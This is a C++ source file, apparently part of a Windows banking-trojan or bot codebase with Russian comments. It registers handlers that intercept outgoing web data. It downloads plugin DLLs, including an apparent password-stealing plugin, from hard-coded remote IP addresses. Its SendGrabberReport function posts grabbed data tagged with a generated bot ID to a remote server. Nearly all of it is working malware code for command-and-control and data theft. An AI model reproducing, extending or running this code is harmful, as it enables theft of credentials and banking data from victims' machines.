#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include "shlobj.h"

#include "Loader.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Crypt.h"
#include "BotUtils.h"
#include "Inject.h"
#include "BotClasses.h"
#include "BotHTTP.h"


#include "Utils.h"

#include "Modules.h"


#include "DbgTemplates.h"



typedef struct TSendDataHandler
{
	PCHAR HandleURL;       // Адрес который необходимо обработать
	PCHAR URL; 			   // Рабочий адрес
	PSendDataEvent Event;  // Событие обработки
	THandleDataMode Mode;  // Режим обработки
} *PSendDataHandler;




// Список зарегистрированных обработчиков отправки данных
HANDLE SendHandlersTID = NULL;  //  Инициализауию глобальных данных буднм
				        	   //  привязывать к идентификатору потока
PList SendDataHandlers = NULL;


void DestroyDataHandler(LPVOID Data)
{
	// Уничтожить данные
	PSendDataHandler H =  (PSendDataHandler)Data;
	STR::Free(H->HandleURL);
	STR::Free(H->URL);
	FreeStruct(Data);
}


 void InitializeHandlersList()
{
	// Инициализацию списка перехватчиков производим в случее еслт
	// он не создал либо создан в другом процессе
	HANDLE TID = pGetCurrentThreadId();

	if (SendDataHandlers == NULL || SendHandlersTID != TID)
	{
		SendDataHandlers = List::Create();
		List::SetFreeItemMehod(SendDataHandlers, DestroyDataHandler);
		SendHandlersTID = TID;
	}
}


DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL)
{
	// Зарегистрировать обработчик отправки
	if (Event == NULL && Mode == hdmUnknown)
		return 0;

	InitializeHandlersList();

	PSendDataHandler Handler = CreateStruct(TSendDataHandler);
	if (Handler == NULL)
		return 0;

	Handler->HandleURL = STR::New(HandleURL);
	Handler->URL = STR::New(SendURL);
	Handler->Event = Event;
	Handler->Mode = Mode;

	List::Add(SendDataHandlers, Handler);

	return (DWORD)Handler;
}

SOCKET MyConnect( char *Host, int Port )
{
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname( (const char*)Host );

	if ( lpHost == NULL )
	{
		return -1;
	}

	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );

	if( Socket == -1 )
	{
		return -1;
	}

	struct sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = HTONS( (unsigned short)Port );

	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
	{
		pclosesocket(Socket);
		return -1;
	}

	return Socket;
}

bool MySend( SOCKET Socket, const char *Data, int DataLen )
{
	if ( (int)psend( Socket, Data, DataLen, 0 ) == SOCKET_ERROR )
	{
		return false;
	}

	return true;
}

bool CheckHost( char *Host )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	bool ret = false;

	SOCKET Socket = MyConnect( Host, 80 );

	if ( Socket != -1 )
	{
		ret = true;
	}

	pclosesocket( Socket );

	return ret;
}

typedef struct
{
	HINTERNET hInstance;
	HINTERNET hConnect;
	HINTERNET hRequest;

	HANDLE hConnectedEvent;
	HANDLE hRequestOpenedEvent;
	HANDLE hRequestCompleteEvent;

	DWORD dwCurrent;

	bool IsDownloaded;
} ASYNCHTTP, *PASYNCHTTP;

//----------------------------------------------------------------------------
LPVOID DownloadPlugin(PCHAR URL, DWORD *ModuleSize)
{
	// Функция загружает плагин (DLL)
	PCHAR Buf = NULL;

	// Функция считаевает файл по адресу URL в буФер Buf
		if (URL == NULL)
			return false;
#ifdef _DEBUG
	pOutputDebugStringA("Before DownloadPlugin HTTPCreateRequest");
#endif

	PHTTPRequest R = HTTPCreateRequest(URL);

#ifdef _DEBUG
	pOutputDebugStringA("After DownloadPlugin HTTPCreateRequest");
#endif	

	HTTP::TResponseData Response;
	ClearStruct(Response);

	Response.Buffer = &Buf;
	Response.Size = ModuleSize;

#ifdef _DEBUG
	pOutputDebugStringA("Before DownloadPlugin ExecuteMethod");
#endif

	bool Res = HTTP::ExecuteMethod(R, &Response);

#ifdef _DEBUG
	pOutputDebugStringA("After DownloadPlugin ExecuteMethod");
#endif		
	
	HTTPFreeRequest(R);
	
	if (Res == false)
		return NULL;

	return Buf;
}

//----------------------------------------------------------------------------
LPVOID DownloadPluginFromPath(PCHAR Path, DWORD *ModuleSize)
{
	// Функция загружает с сервера плагин (DLL)
	//	Path - относительный путь к плагину. Должен начинаться с
	//        обратного слеша /
	if (STR::IsEmpty(Path)) return NULL;

	PCHAR Host = "178.63.11.137"/**"94.240.148.127"*/;//GetCurrentHost2();
	if (Host == NULL) return NULL;

	PCHAR URL = STR::New(3, "http://", Host, Path);
//http://94.240.148.127/cfg/passw.plug
	LPVOID Module = DownloadPlugin(URL, ModuleSize);

    STR::Free(Host);
	STR::Free(URL);

	return Module;
}





/*
char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved )
{
	DWORD dwLen = 0;

	char *Buffer = NULL;

	int Bytes = 0;

	char *TempBuffer = (char*)MemAlloc( 1024 );

	if ( TempBuffer == NULL )
	{
		return NULL;
	}

	while ( ( Bytes = (int)precv( Socket, TempBuffer, 1024, 0 ) ) != 0 )
	{
		if ( Bytes == -1 )
		{
			break;
		}

		if ( Buffer == NULL )
		{
			Buffer = (char*)MemAlloc( Bytes + 1 );

			if ( Buffer == NULL )
			{
				return NULL;
			}
		}
		else
		{
			char *p = (char*)MemRealloc( Buffer, dwLen + Bytes + 1 );
						
			if ( p == NULL )
			{
				return NULL;
			}

			Buffer = p;
		}

		m_memcpy( Buffer + dwLen, TempBuffer, Bytes );
		dwLen += Bytes;
	}

	MemFree( TempBuffer );

	if ( dwLen > 0 )
	{
		DWORD Offset = 0;

		for ( DWORD i = 0; i < dwLen; i++ )
		{
			if ( Buffer[i]     == '\r' && Buffer[i + 1] == '\n' &&
				 Buffer[i + 2] == '\r' && Buffer[i + 3] == '\n' )
			{
				Offset = i + 4;
				break;
			}
		}

		if ( Offset > 0 )
		{
			Buffer += Offset;
			dwLen  -= Offset;

			*dwRecved = dwLen;

			return Buffer;
		}
	}

	MemFree( Buffer );
	
	return NULL;
}

bool ParseUrl( char *Url, char **Server, char **Path, int *Port )
{
	char *Ptr1 = NULL;
	char *Ptr2 = NULL;
	char *Ptr3 = NULL;
	char *Ptr4 = NULL;

	char *Host		   = (char*)malloc( 512 );
	char *OptionalPort = (char*)malloc( 512 );

	if ( Host == NULL ||
		 OptionalPort == NULL )
	{
		return false;
	}

	DWORD dwPort = 0;

	Ptr1 = strstr( Url, "://" );

	if( Ptr1 )
	{
		Ptr1 += 3;
	}
	else
	{
		Ptr1 = Url;
	}

    Ptr4 = strstr( Ptr1, "/" );
	Ptr2 = strstr( Ptr1, ":" );

	if( !Ptr2 )
	{
		*Port = 80;
		Ptr3   = strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		memcpy( Host, Ptr1, Ptr3 - Ptr1 );
		Host[ Ptr3 - Ptr1 ] = '\0';
	}
	else
	{
		Ptr3 = strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		memcpy( OptionalPort, Ptr2 + 1, Ptr3 - Ptr2 );
		memcpy( Host, Ptr1, Ptr2 - Ptr1 );

		OptionalPort[ Ptr3 - Ptr2 ] = '\0';
		Host[ Ptr2 - Ptr1 ]			= '\0';

		*Port = atoi( OptionalPort );
	}

	free( OptionalPort );

	*Server = Host;
	*Path   = Ptr4;

	return true;
}
*/
/*
bool AsyncDownload1( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}
	
	char *Host = NULL;
	char *Path = NULL;
	int   Port = 80;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	SOCKET Socket = MyConnect( Host, Port );
	DWORD err = GetLastError();

	if( Socket == -1 )
	{
		return false;
	}
	
	char *UserAgent = NULL;
	UserAgent = (char*)MemAlloc( 1024*sizeof(char) );
	DWORD dwUserSize = 1024*sizeof(WCHAR);

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *query=(char*)MemAlloc(2048*sizeof(char));

	plstrcpyA(query,"GET /");
	plstrcatA(query,Path);
	plstrcatA(query," HTTP/1.1\r\nAccept:  \r\n ");
	plstrcatA(query,"Accept-Language: ru \r\n");
	plstrcatA(query,"UA-CPU: x86 \r\n");
	plstrcatA(query,"Accept-Encoding: gzip, deflate \r\n");
	plstrcatA(query,"User-Agent: ");
	plstrcatA(query,UserAgent);
	plstrcatA(query,"\r\nHost: ");
	plstrcatA(query,Host);
	plstrcatA(query,"\r\nConnection: Keep-Alive \r\n\r\n\r\n");



	bool b = MySend( Socket, (const char *)query, (int)strlen( query ) );


	MemFree( Host );
	//free( Path );
	MemFree( UserAgent );
	MemFree( query );
	if ( !b )
	{
		return false;
	}

	DWORD dwSizeFile = 0;

	char *Buffer = RecvAndParse( Socket, &dwSizeFile );

	if ( !Buffer )
	{
		pclosesocket( Socket );
		return false;
	}

	if ( dwSize )
	{
		*lpBuffer  = (LPBYTE)Buffer;
		*dwSize    = dwSizeFile;

		return true;
	}

	return false;
}


bool DownloadInternet( char *Url, LPBYTE *lpMem, LPDWORD dwMemSize  )
{
	LPBYTE lpMemory;
	DWORD  dwMemorySize;

	bool ret = AsyncDownload1( Url, &lpMemory, &dwMemorySize );

	if ( ret )
	{
		*lpMem		= lpMemory;
		*dwMemSize	= dwMemorySize;
	}
	

	return ret;
}
*/

bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize )
{
	return HTTP::Get(Url,(PCHAR*)lpMem,dwSize);	//DownloadInternet( Url, lpMem, dwSize );
}


//----------------------------------------------------------------------------

bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
{
	if (STR::IsEmpty(URL) || Buf == NULL || BufSize == 0)
		return false;

	// Собираем  данные сниффера

	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", BotID);
	AddURLParam(Fields, "base", Buf, BufSize);
    STR::Free(BotID);


		bool Result =  HTTP::Post(URL, Fields, NULL);


	Strings::Free(Fields);

	return Result;
}

//----------------------------------------------------------------------------